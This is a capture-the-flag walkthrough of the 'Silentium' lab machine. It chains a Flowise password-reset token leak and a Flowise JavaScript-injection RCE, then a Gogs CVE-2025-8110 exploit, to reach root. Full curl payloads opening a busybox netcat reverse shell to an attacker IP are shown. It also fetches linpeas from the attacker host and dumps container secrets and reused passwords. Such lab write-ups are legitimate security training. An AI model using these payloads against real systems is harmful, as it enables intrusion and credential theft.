# Silentium: Easy

```sh
sudo vim /etc/hosts
# add silentium.htb

nmap -T4 -p- -A -Pn -v silentium.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
    * 80/tcp: http: nginx 1.24.0

* the webpage is a corporate website for a lending firm: we can explore it for any info

* the website lists the employee names:

    * Marcus Thorne
    * Ben
    * Elena Rossi

* web scan:

    ```sh
    feroxbuster -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with small wordlist

    ffuf -c -u 'http://silentium.htb' -H 'Host: FUZZ.silentium.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 178 -s
    # subdomain scan

    feroxbuster -u http://silentium.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with medium wordlist
    ```

* the directory scan using ```feroxbuster``` gives us multiple false positives

* the subdomain scan using ```ffuf``` gives us a subdomain 'staging.silentium.htb': update this in ```/etc/hosts```

* navigating to this subdomain leads to 'http://staging.silentium.htb/signin', where we have a login page for Flowise: the sign-in forms requires email and password

* Googling about Flowise shows that it is a [tool to build AI agents in a visual manner](https://github.com/flowiseai/flowise)

* we can try Googling for default creds, but it shows that Flowise does not have any default creds

* as the login form requires an email and not an username, we can try creds like 'admin@silentium.htb:admin': this gives an error message "User Not Found"

* we can try other usernames based on the member names found earlier, such as:

    * marcus@silentium.htb
    * ben@silentium.htb
    * elena@silentium.htb

* we can try using username generator scripts as well to check for all possible email addresses

* however, checking for Ben: as there is no last name: if we try creds like 'ben@silentium.htb:admin': we get a different error message "Incorrect Email or Password"

* this indicates that the email "ben@silentium.htb" is valid; we just need a valid password now

* we can try web scans again for the Flowise subdomain:

    ```sh
    feroxbuster -u http://staging.silentium.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with small wordlist

    feroxbuster -u http://staging.silentium.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with medium wordlist
    ```

* directory scanning does not give us any other pages

* while we have a valid email address, we do not have a password for it

* we can try checking the Flowise version but the website does not include any version info

* Googling on how to find Flowise version shows that we can check the API endpoints '/api/v1/version' or '/api/v1/health'

* navigating to '/api/v1/version' gives us the Flowise version 3.0.5

* Googling for exploits associated with Flowise 3.0.5 leads to multiple exploits:

    * [CVE-2025-59528: authenticated RCE exploit](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p)
    * [CVE-2025-58434: unauthenticated password-reset token disclosure for account takeover](https://www.ionix.io/threat-center/cve-2025-58434/)

* the RCE exploit needs valid creds; however the password-reset exploit does not need any creds, so we can try it for account takeover

* the [Github advisory for CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph) includes a POC that we can follow:

    * first, request a reset token:

        ```sh
        curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb"}}'
        ```
    
    * this gives a HTTP 201 response: and it includes a 'tempToken' field which can be used to reset the password:

        ```sh
        curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb","tempToken":"Vt5NZfHJRdIccQ1HVfUxicp9okmGGYoQjgj53lt0Sa2rhdebIR92ceF9B5xsjvvJ","password":"NewPass123!"}}'
        ```
    
    * this resets the password, and now we can login as 'ben' with the new password

* after logging in, we have access to the dashboard view: we can first explore for any clues

* the only information we have currently is the API key from the '/apikey' endpoint: we can note the key value

* we can now attempt the [exploit PoC for CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p):

    * the PoC requires interaction with the '/api/v1/node-load-method/customMCP' endpoint, and also needs the token value: this actually refers to the API key value found earlier

    * we can first test with ping command and check for incoming ICMP packets:

        ```sh
        sudo tcpdump -i tun0 icmp
        # setup ping listener

        curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP -H "Content-Type: application/json" -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" -d '{"loadMethod": "listActions","inputs": {"mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 4 10.10.14.95\");return 1;})()})"}}'
        # for the actual command, the double quotes need to be escaped
        # this works
        ```
    
    * as RCE is confirmed, we can use this to get a reverse shell

    * we can use a revshell one-liner like ```busybox nc 10.10.14.95 4444 -e sh```:

        ```sh
        nc -nvlp 4444
        # setup listener

        curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP -H "Content-Type: application/json" -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" -d '{"loadMethod": "listActions","inputs": {"mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"busybox nc 10.10.14.95 4444 -e sh\");return 1;})()})"}}'
        # we get reverse shell
        ```

* in reverse shell:

    ```sh
    id
    # root

    pwd
    # '/'

    ls -la
    # '.dockerenv' found in filesystem root

    ls -la /home
    # one user 'node'

    ls -la /home/node
    # empty

    ls -la /root
    # includes non-default '.flowise' directory

    ls -la /root/.flowise
    # check for any sensitive info

    cat /root/.flowise/encryption.key

    env
    ```

* the reverse shell lands us in a Docker instance, and we do not have any standard users in this container

* the ```/root``` folder contains a directory for Flowise, and two files seem to contain secrets: 'database.sqlite' and 'encryption.key'

* the 'encryption.key' file gives us a key: "hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc"

* as Docker environment variables seem to contain secrets, we can check the env variables using ```env``` - this gives us some secrets:

    * flowise username is 'ben'
    * flowise password is 'F1l3_d0ck3r'
    * sender email is 'ben@silentium.htb'
    * SMTP password is 'r04D!!_R4ge'

* based on the info so far, we can try SSH login using possible creds 'ben:F1l3_d0ck3r' and 'ben:r04D!!_R4ge':

    ```sh
    ssh ben@silentium.htb
    # the SMTP password works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # not available

    ls -la /home
    # only one user 'ben'
    ```

* we can try basic enum using ```linpeas``` - fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-107-generic, Ubuntu 24.04.4
    * multiple ports listening locally: 1025,3000,3001,8025,39915
    * port 3001 seems to host a domain 'staging-v2-code.dev.silentium.htb' locally
    * non-default files in ```/opt```

* we can check the files in ```/opt``` first:

    ```sh
    ls -la /opt
    # non-default folder 'gogs'

    ls -la /opt/gogs
    # we can read only one folder - 'gogs'

    ls -la /opt/gogs/gogs
    # check for any secrets

    ls -la /opt/gogs/gogs/custom

    ls -la /opt/gogs/gogs/custom/conf

    cat /opt/gogs/gogs/custom/conf/app.ini
    ```

* the ```/opt/gogs/gogs``` folder seems to contain data for a binary ```gogs```

* the file ```/opt/gogs/gogs/custom/conf/app.ini``` includes config for an app: and gives us the following data:

    * the brand name is 'Gogs', and the app is running as 'root'
    * the web server is hosted locally on port 3001 with the domain 'staging-v2-code.dev.silentium.htb'
    * the DB is in ```/opt/gogs/data/gogs.db``` - but we don't have access to this file
    * the root path for the repository is ```/root/gogs-repositories```
    * the app config includes a secret key 'sdsrcxSm0iC7wDO'

* Googling about ```gogs``` shows that [it is a self-hosted Git service](https://github.com/gogs/gogs)

* we can use SSH port forwarding to check the website on port 3001, from our attacker:

    ```sh
    ssh -L 3001:localhost:3001 ben@silentium.htb
    ```

* now, we can check the ```gogs``` service on 'http://localhost:3001' on attacker

* this leads to the hompage for Gogs: it is similar to Gitea; we can explore for any clues as we have options to Register/Login

* exploring the repos does not show anything; exploring the users mentions 'ben' as the only user

* we can try signing in as 'ben' using the passwords found earlier, as well as the secret key, but it does not work

* we can try registering a new user instead; but logging in with a new user also does not show any repos

* we can try to check Gogs version for any exploits; there are no version indicators in the webpage

* we can try checking Gogs version from the target binary:

    ```sh
    ls -la /opt/gogs/gogs
    # we have the gogs binary here

    /opt/gogs/gogs/gogs -v
    # 0.13.3
    ```

* Googling for Gogs 0.13.3 exploits leads to [CVE-2025-8110: a RCE exploit](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)

* Googling for exploits leads us to [this exploit](https://github.com/zAbuQasem/gogs-CVE-2025-8110): we can try it:

    ```sh
    # download the exploit
    python3 CVE-2025-8110.py

    nc -nvlp 5555
    # setup listener

    python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.14.95 -lp 5555
    # as gogs is forwarded to local port 3001

    # this gives us an error "Registration failed: 200"
    ```

* the exploit script fails in the registration step

* as we already have a registered user, we can use the test user creds and delete the registration function from the exploit:

    ```sh
    vim CVE-2025-8110.py
    # edit the exploit script
    # remove the registration function from the script, and all its mentions

    # and modify the username/password for gogs

    python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.14.95 -lp 5555
    # we get a different error this time

    # 'author identity unknown'
    # 'fatal: unable to auto-detect email address'

    # we need to set the git username and email for git CLI to work

    git config --global user.email "testuser@email.com"
    git config --global user.name "testuser"

    python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.14.95 -lp 5555
    # this time, it works
    # we get reverse shell
    ```

    ```sh
    # in reverse shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
